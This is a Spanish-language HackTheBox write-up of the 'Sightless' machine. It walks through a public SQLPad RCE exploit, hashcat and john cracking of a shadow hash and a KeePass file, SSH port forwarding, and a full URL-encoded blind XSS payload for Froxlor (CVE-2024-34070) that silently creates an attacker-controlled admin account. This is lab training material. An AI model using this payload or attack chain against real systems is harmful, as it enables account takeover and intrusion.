---
layout: post
title: "Sightless Writeup"
date: 2026-02-12
categories: [HackTheBox, Linux]
image: "/assets/images/sightless.png"
description: "Resolviendo la máquina Sightless..."
---


Primero un nmap
```ruby
╭─ root@exegol    /workspace/HTB/Machines/Sightless/nmap                                                                                                                                         󰓾 10.129.231.103   07:24:15 PM
╰─❯ nmap -p- --open -sCV --min-rate 5000 -vvv -Pn -n 10.129.231.103 -oN Target
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.

<SNIP>

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.231.103]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c96e3b8fc6032905e5a0ca0090c95c52 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoivagBalUNqQKPAE2WFpkFMj+vKwO9D3RiUUxsnkBNKXp5ql1R+kvjG89Iknc24EDKuRWDzEivKXYrZJE9fxg=
|   256 9bde3a27773b1be1195f1611be70e056 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF+qR5j36q9mO+bu
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=2/10%Time=698BBE47%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,A3,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20Ser
SF:ver\)\x20\[::ffff:10\.129\.231\.103\]\r\n500\x20Invalid\x20command:\x20
SF:try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x
SF:20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

![](/assets/images/writeups/Pasted image 20260210192942.png)

Luego de una hora intentando entrar a la página (tenía el mtu de tun0 en 1500, al bajarlo a 1200 me permitió entrar) nos encontramos con una página:

![](/assets/images/writeups/Pasted image 20260210202756.png)

La cuál al revisarla y viendo el código fuente de la página nos encontramos con `http://sqlpad.sightless.htb/` la cuál agregamos a nuestros archivo `/etc/hosts`  para poder acceder al subdominio de la web.

```ruby
echo "10.129.231.103 - sqlpad.sightless.htb" | sudo tee -a /etc/hosts
```

Al haber entrado, logramos ver la versión de SQLPad; `6.10.0`

![](/assets/images/writeups/Pasted image 20260210203545.png)


Haciendo una búsqueda rápida en Google `sqlpad 6.10.0 exploit` se encuentra el siguiente repositorio en github: https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944.git el cuál se trata de un exploit de la vulnerabilidad
`CVE-2022-0944` La cuál es un RCE de sqlpad para las versiones 6.10.0 (incluyendo) y anteriores.

![](/assets/images/writeups/Pasted image 20260210204704.png)

Con el exploit obtemos foothold, usándolo de la siguiente manera:

```ruby
python3 exploit.py http://sqlpad.sightless.htb/ $IP $PORT
```

y obtenemos web shell.  Mientras enumeramos con `linpeas.sh` podemos identificar un hash con el usuario `michael` 

`michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::`

Intentamos crackear con hashcat: 

```ruby
╭─ root@exegol    ~/Downloads                                                                                                                                                             󰓾 10.129.231.103   19s   09:04:01 PM
╰─❯ hashcat --hash-type 1800 --attack-mode 0 hash.txt `fzf-wordlists`
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 5 3600 6-Core Processor, 6909/13883 MB (2048 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /opt/lists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa....L2IJD/
Time.Started.....: Tue Feb 10 21:05:17 2026 (18 secs)
Time.Estimated...: Tue Feb 10 21:05:35 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/lists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     3189 H/s (7.62ms) @ Accel:128 Loops:1024 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 58496/14344384 (0.41%)
Rejected.........: 0/58496 (0.00%)
Restore.Point....: 58368/14344384 (0.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
Candidate.Engine.: Device Generator
Candidates.#1....: kokokoko -> iloverhys

Started: Tue Feb 10 21:04:31 2026
```


Pudimos identificar el que el hash es SHA-512 por el identificador (valga la redundancia) del mismo, siendo `$6$`. La contraseña como se puede ver en el output es `insaneclownposse`

Al obtener la contraseña para el user `michael`, simplemente nos logeamos mediante ssh y ya obtenemos la user.txt

![](/assets/images/writeups/Pasted image 20260210211453.png)

Luego de encontrar la flag del user, procedemos a hacer Privilege escalation, primero revisamos si hay sudoers con `sudo -l`, lo cuál observamos que el user michael no puede usar sudo. Luego de ello lo que vemos es los puertos para ver si hay algún servicio en el cuál podemos elevar nuestros privilegios, para ellol usamos el comando `netstat -tunlp` y se observan varios puertos abiertos-> 

![](/assets/images/writeups/Pasted image 20260211192532.png)

Como ya sabemos, estamos trabajando con una API,  entonces hacemos un curl a cada puerto a ver que nos trae devuelta; Mientras lo hacíamos el comando `curl -s http://127.0.0.1:45501/json` nos entregó algo interesante; un subdominio admin y y la aplicación `Froxlor` en el puerto 8080:
![](/assets/images/writeups/Pasted image 20260211194758.png)

añadimos el subdominio a nuestro `/etc/hosts` y entramos. Pero no sin antes hacer un port forwarding; Como vemos el puerto 8080 abierto y en escucha, hacemos un port forwarding mediante ssh desde nuestra máquina host:

```ruby
╭─ root@exegol    /workspace/HTB/Machines/Sightless                                                                                                                                                       3m 45s   07:28:42 PM
╰─❯ ssh michael@sightless.htb -L 8081:127.0.0.1:8080
ignoring bad CNAME "-" for host "sightless.htb": domain name "-" starts with invalid character
michael@sightless.htb's password:
Last login: Wed Feb 11 23:25:08 2026 from 10.10.14.57
```

y ya podemos entrar a la página

![](/assets/images/writeups/Pasted image 20260211195132.png)

Al confirmar (nuevamente) que se trata de froxlor, hacemos una búsqueda en google de algún exploit o vulnerabilidad y nos encontramos con la vulnerabilidad `CVE-2024-34070`, específicamente este repositorio de github -> https://github.com/advisories/GHSA-x525-54hf-xr53 lo cuál es un `blind XSS`.

Para utilizarlo en froxlor debemos abrir burpsuite e interceptar el login, con identidad falsa.

![](/assets/images/writeups/Pasted image 20260211195853.png)

Una vez interceptado, el parámetro `loginname` lo cambiamos por esto:

{% raw %}

>[!Note]
admin{{$emit.constructor`function+b(){var+metaTag%3ddocument.querySelector('meta[name%3d"csrf-token"]')%3bvar+csrfToken%3dmetaTag.getAttribute('content')%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d"http%3a//admin.sightless.htb:8080/admin_admins.php"%3bvar+params%3d"new_loginname%3dabcd%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d"%2bcsrfToken%2b"%26page%3dadmins%26action%3dadd%26send%3dsend"%3bxhr.open("POST",url,true)%3bxhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")%3balert("Your+Froxlor+Application+has+been+completely+Hacked")%3bxhr.send(params)}%3ba%3db()`()}}


{% endraw %}

el cuál es el payload que vimos en el github, lo único que modificamos fué la url de https://demo.froxlor.org a http://admin.sightless.htb:8080/admin_admins.php y una vez enviado el paquete, nos logeamos con las credenciales abcd:Abcd@@1234 y entramos como admins a froxlor.

Enumerando, vemos que existe el user web1 en el apartado de tráfico, y que el mismo solo ha tenido tráfico vía FTP.

![](/assets/images/writeups/Pasted image 20260211202348.png)



Indagando en la página, nos permite logearnos como el user web1 simplemente dandole click al nombre, y si entramos a FTP y cuentas, nos permite cambiar la contraseña del user `web1`

![](/assets/images/writeups/Pasted image 20260211203503.png)


Como ya cambiamos la contraseña y sabemos que el user `web1` está utilizando FTP, intentamos logearnos mediante ftp, específicamente mediante FileZilla, con las credenciales ya puestas `web1:Abcd@@1234`

y encontramos en la carpeta backup, un archivo que es de keepass, `Database.kdb`

![](/assets/images/writeups/Pasted image 20260211205055.png)

Lo descargamos y lo obtenemos en nuestra máquina host; con la herramienta `keepass2john` podemos convertirla a hash y luego proceder a crackearla con john the ripper

```ruby
╭─ root@exegol    ~                                                                                                                                                                                           08:49:52 PM
╰─❯ keepass2john Database.kdb > Database.kdb.hash

╭─ root@exegol    ~                                                                                                                                                                                         ✘ 255   08:55:45 PM
╰─❯ john --wordlist=`fzf-wordlists` Database.kdb.hash --format=KeePass
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 128/128 SSE2])
Cost 1 (t (rounds)) is 600000 for all loaded hashes
Cost 2 (m) is 0 for all loaded hashes
Cost 3 (p) is 0 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 3 for all loaded hashes
Will run 12 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Failed to use huge pages (not pre-allocated via sysctl? that's fine)
bulldogs         (Database.kdb)
1g 0:00:00:02 DONE (2026-02-11 20:57) 0.4444g/s 458.7p/s 458.7c/s 458.7C/s simpleplan..harold
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

Como se observa en john, la contraseña es `bulldogs`, procedemos a entrar a la base de datos; Se procede a instalar `kpcli` con `sudo apt install kpcli`

![](/assets/images/writeups/Pasted image 20260211210140.png]]

Enumerando la base de datos, una contraseña y un id_rsa, obtenemos el id_rsa con keepass y el comando  `attach ssh`

![](/assets/images/writeups/Pasted image 20260211210434.png)

Al obtener la clave ssh, si intentamos logearnos como root, mediante ssh, nos daba el error `Load key "id_key": error in libcrypto`, simplemente pasándole el comando `dosunix id_key` resolvimos el problema. Nos logeamos como root y ya obtuvimos la flag del root.txt:

![](/assets/images/writeups/Pasted image 20260211211550.png)

Y eso ha sido todo por esta máquina, he durado bastantes horas haciéndola porque mientras la hacía redactaba el writeup :) Espero les haya gustado mi writeup, aunque no es el mejor de todos es el tercero que hago.
